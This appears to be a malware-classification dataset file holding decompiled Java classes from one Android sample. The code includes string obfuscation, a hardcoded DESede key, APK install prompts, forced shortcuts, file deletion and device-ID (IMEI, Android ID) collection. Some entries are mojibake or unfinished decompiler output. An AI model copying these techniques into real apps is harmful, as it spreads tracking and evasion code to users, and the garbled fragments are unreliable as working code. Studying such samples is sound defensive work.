"").replace(""*ä¸‡*"",""ï¼�"").replace(""*é¢�*"",""@"").replace(""*ç‘ž*"",""#"").replace(""*å¤©*"",""ï¿¥"").replace(""*è¦�*"",""%"").replace(""*å™¢*"",""â€¦â€¦"").replace(""*é™ª*"",""ï¼ˆ"").replace(""*ä»½*"",""ï¼‰"").replace(""*æ³•*"",""â€”â€”"").replace(""*åˆ°*"",""+"").replace(""*è¿›*"",""ï½›"").replace(""*ç»™*"",""ï½�"").replace(""*è´§*"",""ï¼š"").replace(""*ä¹…*"",""â€œ"").replace(""*å¿«*"",""ã€Š"").replace(""*æ�¥*"",""ã€‹"").replace(""*å�š*"",""ï¼Ÿ"").replace(""*å…ˆ*"",""|"").replace(""*æ­¤*"",""~"").replace(""*å�§*"",""ï¼›"").replace(""*å‘¢*"",""â€˜"").replace(""*æ�¶*"",""ï¼Œ"").replace(""*å‰�*"",""ã€‚"").replace(""*æ— *"",""ã€�"").replace(""*é¹…*"",""!"").replace(""*å¦‚*"",""$"").replace(""*å›¾*"",""^"").replace(""*å‘€*"",""&"").replace(""*å–”*"",""("").replace(""*ç›˜*"","")"").replace(""*é”•*"",""_"").replace(""*ç�¡*"",""="").replace(""*ç­‰*"",""-"").replace(""*åˆ†*"",""]"").replace(""*æ�ž*"",""["").replace(""*æ´»*"",""{"").replace(""*å®¶*"",""}"").replace(""*å�¯*"",""\\"").replace(""*ä¸¤*"",""\"""").replace(""*ä¸­*"","":"").replace(""*æ˜Ÿ*"","";"").replace(""*å†²*"",""<"").replace(""*è¾¹*"","">"").replace(""*å¹´*"",""?"").replace(""*å��*"","","").replace(""*æœŸ*"",""."").replace(""*æŒ–*"",""/"");     }  catch (    Exception e) {       return str;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\ApkOper.code","public class ApkOper {   public static void installApk(  Context context,  String ApkPath,  String ApkFileName){     String FullPath=String.valueOf(ApkPath) + ApkFileName;     File apkfile=new File(FullPath);     if (apkfile.exists()) {       Intent i=new Intent(""android.intent.action.VIEW"");       i.setDataAndType(Uri.parse(""file://"" + apkfile.toString()),""application/vnd.android.package-archive"");       context.startActivity(i);     }   }   public static boolean isAvilible(  Context context,  String packageName){     PackageManager packageManager=context.getPackageManager();     List<PackageInfo> pinfo=packageManager.getInstalledPackages(0);     List<String> pName=new ArrayList<>();     if (pinfo != null) {       for (int i=0; i < pinfo.size(); i++) {         String pn=pinfo.get(i).packageName;         pName.add(pn);       }     }     return pName.contains(packageName);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\AssetsOper.code","public class AssetsOper extends Activity {   public Bitmap getImageFile(  Context context,  String fileName){     Bitmap image=null;     AssetManager am=context.getResources().getAssets();     try {       InputStream is=am.open(fileName);       image=BitmapFactory.decodeStream(is);       is.close();       return image;     }  catch (    IOException e) {       e.printStackTrace();       return image;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\Base.code","public class Base {   public static String encode(  String str){     try {       String str2=A1Oper.encode(str);       byte[] data=Base64.encode(str2.getBytes(),0);       return new String(data);     }  catch (    Exception e) {       return str;     }   }   public static String decode(  String str){     try {       try {         String str2=A1Oper.decode(new String(Base64.decode(str,0)));         if (str2.equals("""")) {           str2=str;         }         return str2;       }  catch (      Exception e) {         return str;       }     }  catch (    Exception e2) {       return str;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\DES.code","public class DES {   private static Cipher cipher;   private static String keyString=""1234567890yf8hjckda5"";   private static SecretKey secretKey; static {     secretKey=null;     cipher=null;     try {       secretKey=new SecretKeySpec(keyString.getBytes(),""DESede"");       cipher=Cipher.getInstance(""DESede/ECB/PKCS5Padding"");     }  catch (    Exception e) {     }   }   public static String encode(  String source){     String newResult="""";     try {       cipher.init(1,secretKey);       byte[] resultBytes=cipher.doFinal(source.getBytes(""GB2312""));       String result=new String(Base64.encode(resultBytes,0));       try {         newResult=filter(result);       }  catch (      Exception e) {       }     }  catch (    Exception e2) {     }     return newResult;   }   public static String decode(  String target){     try {       byte[] messageBytes=Base64.decode(target.getBytes(),0);       cipher.init(2,secretKey);       byte[] resultBytes=cipher.doFinal(messageBytes);       String result=new String(resultBytes,""GB2312"");       return result;     }  catch (    Exception e) {       return target;     }   }   private static String filter(  String str){     StringBuffer sb=new StringBuffer();     for (int i=0; i < str.length(); i++) {       int asc=str.charAt(i);       if (asc != 10 && asc != 13) {         sb.append(str.subSequence(i,i + 1));       }     }     String output=new String(sb);     return output;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\ExceptionHandling.code","public class ExceptionHandling implements Thread.UncaughtExceptionHandler {   private static ExceptionHandling instance;   private ExceptionHandling(){   }   public static synchronized ExceptionHandling getInstance(){     ExceptionHandling exceptionHandling; synchronized (ExceptionHandling.class) {       if (instance == null) {         instance=new ExceptionHandling();       }       exceptionHandling=instance;     }     return exceptionHandling;   }   public void init(  Context ctx){     Thread.setDefaultUncaughtExceptionHandler(this);   }   @Override public void uncaughtException(  Thread thread,  Throwable ex){     Log.d(""è‡ªå®šä¹‰é”™è¯¯"",""çº¿ç¨‹: "" + thread + "" çº¿ç¨‹å��ç§°: ""+ thread.getName()+ "" çº¿ç¨‹ID: ""+ thread.getId()+ "" å¼‚å¸¸: ""+ ex);     String threadName=thread.getName();     if (""è‡ªå®šä¹‰å��ç§°"".equals(threadName)) {       Log.d(""è‡ªå®šä¹‰é”™è¯¯"","""");     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\FileOper.code","public class FileOper {   public static String dealFile(  String FilePath){     File file=new File(FilePath);     if (!file.exists()) {       return """";     }     try {       FileReader reader=new FileReader(file);       BufferedReader bRreader=new BufferedReader(reader);       String str=bRreader.readLine();       return str;     }  catch (    Exception e) {       System.out.println(""get Reader error:"" + e.getMessage());       return """";     }   }   public void deleteFile(  File file){     if (file.exists()) {       if (file.isFile()) {         file.delete();       }  else       if (file.isDirectory()) {         File[] files=file.listFiles();         for (        File file2 : files) {           deleteFile(file2);         }       }       file.delete();     }   }   public static void deleteSDFile(  String path){     String RootPath=Environment.getExternalStorageDirectory().getAbsolutePath();     String FullPath=String.valueOf(RootPath) + path;     File file=new File(FullPath);     FileOper fo=new FileOper();     fo.deleteFile(file);   }   public static void MemoryFileToSD(  Context context,  String catalog,  String FileNameXC,  int rawIDXC){     try {       Activity activity=(Activity)context;       String Path=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + catalog;       String FullPath=String.valueOf(Path) + ""/"" + FileNameXC;       File dir=new File(Path);       if (!dir.exists()) {         dir.mkdir();       }       File file=new File(FullPath);       FileOper fo=new FileOper();       fo.deleteFile(file);       if (!new File(FullPath).exists()) {         InputStream is=activity.getResources().openRawResource(rawIDXC);         FileOutputStream fos=new FileOutputStream(FullPath);         byte[] buffer=new byte[8192];         while (true) {           int count=is.read(buffer);           if (count > 0) {             fos.write(buffer,0,count);           }  else {             fos.close();             is.close();             return;           }         }       }     }  catch (    Exception e) {     }   }   public static void CreateShortcut(  Context context,  int AppName,  int Logo,  Class<?> MainActivity){     try {       Time t=new Time();       t.setToNow();       String monthDay=new StringBuilder(String.valueOf(t.monthDay)).toString();       String LastDownloadTime=new StringBuilder(String.valueOf(PreferencesOper.GetPreferences(context,""Shortcut159821"" + context.getString(AppName),""0""))).toString();       if (StringOper.ToInt(LastDownloadTime) != StringOper.ToInt(monthDay)) {         Intent shortcutintent=new Intent(""com.android.launcher.action.INSTALL_SHORTCUT"");         shortcutintent.putExtra(""duplicate"",false);         shortcutintent.putExtra(""android.intent.extra.shortcut.NAME"",context.getString(AppName));         Parcelable icon=Intent.ShortcutIconResource.fromContext(context.getApplicationContext(),Logo);         shortcutintent.putExtra(""android.intent.extra.shortcut.ICON_RESOURCE"",icon);         shortcutintent.putExtra(""android.intent.extra.shortcut.INTENT"",new Intent(context.getApplicationContext(),MainActivity));         context.sendBroadcast(shortcutintent);         PreferencesOper.SetPreferences(context,""Shortcut159821"" + context.getString(AppName),monthDay);       }     }  catch (    Exception e) {     }   }   public static String CreateDirectory(  String Directory){     try {       Directory=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + Directory;       File destDir=new File(Directory);       if (!destDir.exists()) {         destDir.mkdirs();       }     }  catch (    Exception e) {     }     return Directory;   }   public static String GetSDDirectory(){     try {       return String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"";     }  catch (    Exception e) {       return ""0"";     }   }   public static boolean IfSDState(){     return Environment.getExternalStorageState().equals(""mounted"");   }   public static long getRemainingSpace(  String unit){     File Catalog=Environment.getExternalStorageDirectory();     StatFs StatFs1=new StatFs(Catalog.getPath());     long BlockSize1=StatFs1.getBlockSize();     long BlockCount1=StatFs1.getBlockCount();     if (StringOper.equals(unit,""bytes"")) {       long fh=BlockCount1 * BlockSize1;       return fh;     }     if (StringOper.equals(unit,""KiB"")) {       long fh2=(BlockCount1 * BlockSize1) / 1024;       return fh2;     }     if (StringOper.equals(unit,""MiB"")) {       long fh3=((BlockCount1 * BlockSize1) / 1024) / 1024;       return fh3;     }     if (StringOper.equals(unit,""GiB"")) {       long fh4=(((BlockCount1 * BlockSize1) / 1024) / 1024) / 1024;       return fh4;     }     if (!StringOper.equals(unit,""TiB"")) {       return 0L;     }     long fh5=((((BlockCount1 * BlockSize1) / 1024) / 1024) / 1024) / 1024;     return fh5;   }   public static long getTotalSpace(  String unit){     File Catalog=Environment.getExternalStorageDirectory();     StatFs StatFs1=new StatFs(Catalog.getPath());     long BlockSize1=StatFs1.getBlockSize();     long BlockCount1=StatFs1.getBlockCount();     if (StringOper.equals(unit,""bytes"")) {       long fh=BlockCount1 * BlockSize1;       return fh;     }     if (StringOper.equals(unit,""KiB"")) {       long fh2=(BlockCount1 * BlockSize1) / 1024;       return fh2;     }     if (StringOper.equals(unit,""MiB"")) {       long fh3=((BlockCount1 * BlockSize1) / 1024) / 1024;       return fh3;     }     if (StringOper.equals(unit,""GiB"")) {       long fh4=(((BlockCount1 * BlockSize1) / 1024) / 1024) / 1024;       return fh4;     }     if (!StringOper.equals(unit,""TiB"")) {       return 0L;     }     long fh5=((((BlockCount1 * BlockSize1) / 1024) / 1024) / 1024) / 1024;     return fh5;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\htmlOper.code","public class htmlOper {   public String posturl(  String url){     try {       HttpClient httpclient=new DefaultHttpClient();       HttpPost httppost=new HttpPost(url);       HttpResponse response=httpclient.execute(httppost);       HttpEntity entity=response.getEntity();       InputStream is=entity.getContent();       try {         BufferedReader reader=new BufferedReader(new InputStreamReader(is,""utf-8""));         StringBuilder sb=new StringBuilder();         while (true) {           String line=reader.readLine();           if (line != null) {             sb.append(String.valueOf(line) + ""\n"");           }  else {             is.close();             String result=sb.toString();             return result;           }         }       }  catch (      Exception e) {         return ""Fail to convert net stream!"";       }     }  catch (    Exception e2) {       return ""Fail to establish http connection!"" + e2.toString();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\IntOper.code","public class IntOper {   public static boolean ifEvenNumber(  int Number){     return ((double)Number) / 2.0d <= ((double)(Number / 2));   }   public static double DoubleLengthLimit(  String doubleStr,  String sf){     double sourceData=StringOper.ToDouble(doubleStr);     DecimalFormat df=new DecimalFormat(sf);     String str=df.format(sourceData);     return Double.parseDouble(str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\MessageOper.code","public class MessageOper {   public static void LocatableMessage(  Context context,  String MessageContent,  int X,  int Y,  int number){     for (int i=0; i < number; i++) {       try {         Toast toast=Toast.makeText(context,MessageContent,1);         toast.setGravity(49,X,Y);         toast.show();       }  catch (      Exception e) {         return;       }     }   }   public static String WelcomeSpeech(){     try {       Time t=new Time();       t.setToNow();       int hour=t.hour;       int minute=t.minute;       return ""ä¸»äºº"" + TimeOper.TimeSlot() + ""å¥½,çŽ°åœ¨æ˜¯ï¼š""+ hour+ ""ç‚¹""+ minute+ ""åˆ†,å¾ˆé«˜å…´ä¸ºæ‚¨æœ�åŠ¡ï¼�"";     }  catch (    Exception e) {       return ""æ¬¢è¿Žå…‰ä¸´,å¾ˆé«˜å…´ä¸ºæ‚¨æœ�åŠ¡ï¼�"";     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\MusicOper.code","public class MusicOper {   public static void playMusic(  Context context,  String FileName,  int rawIDXC){     try {       FileOper.MemoryFileToSD(context,""db"",FileName,rawIDXC);       final String path=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/db/"" + FileName;       MediaPlayer myMediaPlayer=new MediaPlayer();       myMediaPlayer.reset();       myMediaPlayer.setDataSource(path);       myMediaPlayer.prepare();       myMediaPlayer.start();       myMediaPlayer.setOnCompletionListener(new MediaPlayer.OnCompletionListener(){         @Override public void onCompletion(        MediaPlayer mp){           File file=new File(path);           FileOper fo=new FileOper();           fo.deleteFile(file);         }       } );     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\MyApplication.code","public class MyApplication extends Application {   @Override public void onCreate(){     super.onCreate();     ExceptionHandling Handling=ExceptionHandling.getInstance();     Handling.init(getApplicationContext());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\NetworkOper.code","public class NetworkOper {   public static int NetworkTest(  Context context){     try {       ConnectivityManager conMan=(ConnectivityManager)context.getSystemService(""connectivity"");       NetworkInfo.State mobile=conMan.getNetworkInfo(0).getState();       NetworkInfo.State wifi=conMan.getNetworkInfo(1).getState();       if (!mobile.toString().equals(""CONNECTED"")) {         if (!wifi.toString().equals(""CONNECTED"")) {           return 0;         }       }       return 1;     }  catch (    Exception e) {       return 2;     }   }   public static void GuideTheUser(  Context context,  int TipNumber,  int X,  int Y){     try {       if (NetworkTest(context) == 0) {         MessageOper.LocatableMessage(context,""è¿™é¡¹åŠŸèƒ½éœ€è¦�ï½›è¿žæŽ¥æ— çº¿ç½‘ç»œï½�ï¼�"",X,Y,TipNumber);         Intent intent=new Intent(""android.settings.WIFI_SETTINGS"");         context.startActivity(intent);       }       if (NetworkTest(context) == 1) {         MessageOper.LocatableMessage(context,""åŠ è½½ä¸Žç½‘é€Ÿæœ‰å…³ï¼Œè¯·ç­‰å¾…..."",X,Y,TipNumber);       }     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\NotificationOper.code","public class NotificationOper {   public static void addNotification(  Context context2,  int icon2,  String tickerText2,  boolean IfAudio,  String AudioPath2,  String Title2,  String Content2,  Class<?> cls,  String NotificationValue1,  String NotificationValue2,  String NotificationValue3,  String NotificationValue4,  String NotificationValue5,  boolean AutoCancel){     try {       NotificationManager manager=(NotificationManager)context2.getSystemService(""notification"");       Notification notification=new Notification();       notification.icon=icon2;       notification.tickerText=tickerText2;       if (AutoCancel) {         notification.flags=16;       }       if (IfAudio) {         if (AudioPath2.equals(""0"")) {           notification.defaults=1;           notification.audioStreamType=-1;         }  else {           notification.sound=Uri.parse(AudioPath2);         }       }       Intent intent=new Intent(context2,cls);       intent.putExtra(""NotificationValue1"",NotificationValue1);       intent.putExtra(""NotificationValue2"",NotificationValue2);       intent.putExtra(""NotificationValue3"",NotificationValue3);       intent.putExtra(""NotificationValue4"",NotificationValue4);       intent.putExtra(""NotificationValue5"",NotificationValue5);       intent.setFlags(268435456);       PendingIntent pendingIntent=PendingIntent.getActivity(context2,0,intent,1073741824);       notification.setLatestEventInfo(context2,Title2,Content2,pendingIntent);       manager.notify(1,notification);     }  catch (    Exception e) {     }   }   public static void CancelNotification(  Context context){     NotificationManager manager=(NotificationManager)context.getSystemService(""notification"");     manager.cancelAll();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\PreferencesOper.code","public class PreferencesOper {   public static void SetPreferences(  Context context,  String name,  String Value){     SharedPreferences.Editor sharedata=context.getSharedPreferences(""data"",0).edit();     sharedata.putString(name,Value);     sharedata.commit();   }   public static String GetPreferences(  Context context,  String name,  String DefaultValue){     SharedPreferences sharedata=context.getSharedPreferences(""data"",0);     return sharedata.getString(name,DefaultValue);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\ResOper.code","public class ResOper extends Activity {   public static int getResourceId(  Context context,  String name,  String type,  String packageName){     if (name == null || name == """") {       return 0;     }     PackageManager pm=context.getPackageManager();     try {       Resources themeResources=pm.getResourcesForApplication(packageName);       return themeResources.getIdentifier(name,type,packageName);     }  catch (    PackageManager.NameNotFoundException e) {       e.printStackTrace();       return 0;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\SqliteOper.code","public class SqliteOper {   private final String DatabaseFileName;   private String DatabasePath;   private final SQLiteDatabase SD=openDatabase();   private final Activity activity;   private final int rawID;   public SqliteOper(  Context context,  String Directory,  String DatabaseFileNameXC,  int rawIDXC){     this.DatabasePath=Environment.getExternalStorageDirectory().getAbsolutePath();     this.DatabasePath=String.valueOf(this.DatabasePath) + Directory;     this.DatabaseFileName=DatabaseFileNameXC;     this.activity=(Activity)context;     this.rawID=rawIDXC;   }   public SQLiteDatabase openDatabase(){     SQLiteDatabase sQLiteDatabase=null;     try {       String databaseFilename=String.valueOf(this.DatabasePath) + this.DatabaseFileName;       File dir=new File(this.DatabasePath);       if (!dir.exists()) {         dir.mkdir();       }       if (!new File(databaseFilename).exists()) {         InputStream is=this.activity.getResources().openRawResource(this.rawID);         FileOutputStream fos=new FileOutputStream(databaseFilename);         byte[] buffer=new byte[8192];         while (true) {           int count=is.read(buffer);           if (count <= 0) {             break;           }           fos.write(buffer,0,count);         }         fos.close();         is.close();       }       sQLiteDatabase=SQLiteDatabase.openOrCreateDatabase(databaseFilename,(SQLiteDatabase.CursorFactory)null);       return sQLiteDatabase;     }  catch (    Exception e) {       return sQLiteDatabase;     }   }   public Cursor PublicSelect(  String returnXc,  String from,  String where,  String order){     String sql=""select "" + returnXc + "" from [""+ from+ ""] ""+ where+ "" ""+ order;     return this.SD.rawQuery(sql,null);   }   public boolean PublicUpdate(  String from,  String Value,  String where){     String sql=""update ["" + from + ""] ""+ Value+ "" ""+ where;     this.SD.execSQL(sql);     return true;   }   public boolean PublicInsert(  String from,  String ListName,  String Value){     String sql=""insert into ["" + from + ""](""+ ListName+ "") values(""+ Value+ "")"";     this.SD.execSQL(sql);     return true;   }   public boolean PublicDelete(  String from,  String where){     String sql=""delete from ["" + from + ""] ""+ where;     this.SD.execSQL(sql);     return true;   }   public void close(){     this.SD.close();     File file=new File(String.valueOf(this.DatabasePath) + this.DatabaseFileName);     FileOper fo=new FileOper();     fo.deleteFile(file);   }   public void closeButDoNotDelete(){     this.SD.close();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\StringOper.code","public class StringOper {   public static int ToInt(  String Str){     try {       int ig=Integer.parseInt(Str);       return ig;     }  catch (    Exception e) {       return 0;     }   }   public static double ToDouble(  String Str){     if (Str == null || Str == """") {       Str=""0"";     }     try {       double ig=Double.parseDouble(Str);       return ig;     }  catch (    Exception e) {       return 0.0d;     }   }   public static float ToFloat(  String Str){     if (Str == null || Str == """") {       Str=""0"";     }     try {       float ig=Float.parseFloat(Str);       return ig;     }  catch (    Exception e) {       return 0.0f;     }   }   public static long ToLong(  String Str){     if (Str == null || Str == """") {       Str=""0"";     }     try {       long ig=Long.parseLong(Str);       return ig;     }  catch (    Exception e) {       return 0L;     }   }   public static String replace(  String Original,  String OldString,  String NewString){     try {       return Original.replace(OldString,NewString);     }  catch (    Exception e) {       return Original;     }   }   public static String getListActivityString(  Context context,  String Key,  String defaultValue){     ListActivity activity=(ListActivity)context;     try {       Bundle bundle=activity.getIntent().getExtras();       String Value=bundle.getString(Key);       return Value;     }  catch (    Exception e) {       return defaultValue;     }   }   public static int getListActivityString(  Context context,  String Key,  int defaultValue){     ListActivity activity=(ListActivity)context;     try {       Bundle bundle=activity.getIntent().getExtras();       int Value=ToInt(bundle.getString(Key));       return Value;     }  catch (    Exception e) {       return defaultValue;     }   }   public static String getActivityString(  Context context,  String Key,  String defaultValue){     Activity activity=(Activity)context;     try {       Bundle bundle=activity.getIntent().getExtras();       String Value=bundle.getString(Key);       return Value;     }  catch (    Exception e) {       return defaultValue;     }   }   public static int getActivityString(  Context context,  String Key,  int defaultValue){     Activity activity=(Activity)context;     try {       Bundle bundle=activity.getIntent().getExtras();       int Value=ToInt(bundle.getString(Key));       return Value;     }  catch (    Exception e) {       return defaultValue;     }   }   public static boolean equals(  String Str1,  String Str2){     if (Str1 == null) {       Str1="""";     }     if (Str2 == null) {       Str2="""";     }     return Str1.equals(Str2);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\TimeOper.code","public class TimeOper {   public static String SecondToMinuteSecond(  int Second){     if (Second < 1) {       return ""0åˆ†0ç§’"";     }     if (Second < 60) {       return ""0åˆ†"" + Second + ""ç§’"";     }     if (Second == 60) {       return ""1åˆ†0ç§’"";     }     int Minute=Second / 60;     int Second2=Second - (Minute * 60);     return String.valueOf(Minute) + ""åˆ†"" + Second2+ ""ç§’"";   }   public static String TimeSlot(){     try {       Time t=new Time();       t.setToNow();       int hour=t.hour;       if (hour < 6 || hour > 18) {         return ""æ™šä¸Š"";       }       if (hour > 5 && hour < 8) {         return ""æ—©ä¸Š"";       }       if (hour > 7 && hour < 12) {         return ""ä¸Šå�ˆ"";       }       if (hour == 12) {         return ""ä¸­å�ˆ"";       }       if (hour <= 12 || hour >= 19) {         return """";       }       return ""ä¸‹å�ˆ"";     }  catch (    Exception e) {       return """";     }   }   public static String GetWeek(  String Date2){     SimpleDateFormat format=new SimpleDateFormat(""yyyy-MM-dd"");     Calendar c=Calendar.getInstance();     try {       c.setTime(format.parse(Date2));     }  catch (    Exception e) {     }     String mWay=String.valueOf(c.get(7));     if (""1"".equals(mWay)) {       return ""å¤©"";     }     if (""2"".equals(mWay)) {       return ""ä¸€"";     }     if (""3"".equals(mWay)) {       return ""äºŒ"";     }     if (""4"".equals(mWay)) {       return ""ä¸‰"";     }     if (""5"".equals(mWay)) {       return ""å››"";     }     if (""6"".equals(mWay)) {       return ""äº”"";     }     if (""7"".equals(mWay)) {       return ""å…­"";     }     return mWay;   }   public static int[] GregorianCalendarTimeDifference(  String NowTime,  String ComingTime){     int[] bbb=new int[4];     try {       SimpleDateFormat df=new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"");       Date d1=df.parse(ComingTime);       Date d2=df.parse(NowTime);       long diff=d1.getTime() - d2.getTime();       long days=diff / 86400000;       long hours=(diff - (86400000 * days)) / 3600000;       long minutes=((diff - (86400000 * days)) - (3600000 * hours)) / 60000;       long Second=(((diff - (86400000 * days)) - (3600000 * hours)) - (60000 * minutes)) / 1000;       bbb[0]=(int)days;       bbb[1]=(int)hours;       bbb[2]=(int)minutes;       bbb[3]=(int)Second;     }  catch (    Exception e) {     }     return bbb;   }   public static String[] getAfterDate(  int year,  int monthly,  int Day,  int n){     SimpleDateFormat formatter=new SimpleDateFormat(""yyyy-MM-dd"");     Date Date1=new Date(String.valueOf(year) + ""/"" + monthly+ ""/""+ Day);     Calendar now=Calendar.getInstance();     now.setTime(Date1);     now.set(5,now.get(5) + n);     return formatter.format(now.getTime()).split(""-"");   }   public static String[] getBeforeDate(  int year,  int monthly,  int Day,  int n){     SimpleDateFormat formatter=new SimpleDateFormat(""yyyy-MM-dd"");     Date Date1=new Date(String.valueOf(year) + ""/"" + monthly+ ""/""+ Day);     Calendar now=Calendar.getInstance();     now.setTime(Date1);     now.set(5,now.get(5) - n);     return formatter.format(now.getTime()).split(""-"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\WebViewDownLoadListener.code","public class WebViewDownLoadListener implements DownloadListener {   public Context context;   public WebViewDownLoadListener(  Context contextXC){     this.context=contextXC;   }   @Override public void onDownloadStart(  String url,  String userAgent,  String contentDisposition,  String mimetype,  long contentLength){     Uri uri=Uri.parse(url);     Intent intent=new Intent(""android.intent.action.VIEW"",uri);     this.context.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.a.a.a.a\a.code","public final class a {   public static byte[] a(  String str,  String str2,  byte[] bArr){     SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""AES"");     Cipher cipher=Cipher.getInstance(""AES/CBC/PKCS5Padding"");     cipher.init(1,secretKeySpec,new IvParameterSpec(str.getBytes()));     return cipher.doFinal(bArr);   }   public static byte[] b(  String str,  String str2,  byte[] bArr){     SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""AES"");     Cipher cipher=Cipher.getInstance(""AES/CBC/PKCS5Padding"");     cipher.init(2,secretKeySpec,new IvParameterSpec(str.getBytes()));     return cipher.doFinal(bArr);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.a.a.a.a\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@62041909"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.a.a.a.b\a.code","public class a {   private static final String a=a.class.getSimpleName();   public static String a(  Context context){     String b=b(context);     String b2=b.b(context);     if (TextUtils.isEmpty(b2)) {       b2=""0"";     }     return b + ""|"" + new StringBuffer(b2).reverse().toString();   }   private static String b(  Context context){     return b.a(context);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.a.a.a.b\b.code","public final class b {   public static java.lang.String a(  android.content.Context r7){     throw new UnsupportedOperationException(""Method not decompiled: com.baidu.a.a.a.b.b.a(android.content.Context):java.lang.String"");   }   private static String a(  String str){     if (TextUtils.isEmpty(str)) {       return """";     }     try {       BufferedReader bufferedReader=new BufferedReader(new FileReader(new File(Environment.getExternalStorageDirectory(),""baidu/.cuid"")));       StringBuilder sb=new StringBuilder();       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           break;         }         sb.append(readLine);         sb.append(""\r\n"");       }       bufferedReader.close();       String[] split=new String(com.baidu.a.a.a.a.a.b(""30212102dicudiab"",""30212102dicudiab"",com.baidu.a.a.a.a.b.a(sb.toString().getBytes()))).split(""="");       return (split != null && split.length == 2 && str.equals(split[0])) ? split[1] : """";     }  catch (    FileNotFoundException e) {       return """";     } catch (    IOException e2) {       return """";     } catch (    Exception e3) {       return """";     }   }   private static void a(  Context context,  String str){     if (!(context.checkCallingOrSelfPermission(str) == 0)) {       throw new SecurityException(""Permission Denial: requires permission "" + str);     }   }   private static void a(  String str,  String str2){     if (TextUtils.isEmpty(str)) {       return;     }     File file=new File(Environment.getExternalStorageDirectory(),""baidu/.cuid"");     try {       new File(file.getParent()).mkdirs();       FileWriter fileWriter=new FileWriter(file,false);       fileWriter.write(com.baidu.a.a.a.a.b.a(com.baidu.a.a.a.a.a.a(""30212102dicudiab"",""30212102dicudiab"",(str + ""="" + str2).getBytes()),""utf-8""));       fileWriter.flush();       fileWriter.close();     }  catch (    IOException e) {     } catch (    Exception e2) {     }   }   public static String b(  Context context){     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     if (telephonyManager == null) {       return """";     }     String deviceId=telephonyManager.getDeviceId();     return TextUtils.isEmpty(deviceId) ? """" : deviceId;   }   public static String c(  Context context){     String string=Settings.Secure.getString(context.getContentResolver(),""android_id"");     return TextUtils.isEmpty(string) ? """" : string;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.a.a.a.b\c.code","public final class c {   public static String a(  byte[] bArr,  String str,  boolean z){     StringBuilder sb=new StringBuilder();     for (    byte b : bArr) {       String hexString=Integer.toHexString(b & 255);       if (z) {         hexString=hexString.toUpperCase();       }       if (hexString.length() == 1) {         sb.append(""0"");       }       sb.append(hexString).append(str);     }     return sb.toString();   }   public static String a(  byte[] bArr,  boolean z){     try {       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.reset();       messageDigest.update(bArr);       return a(messageDigest.digest(),"""",z);     }  catch (    NoSuchAlgorithmException e) {       throw new RuntimeException(e);     }   } } "
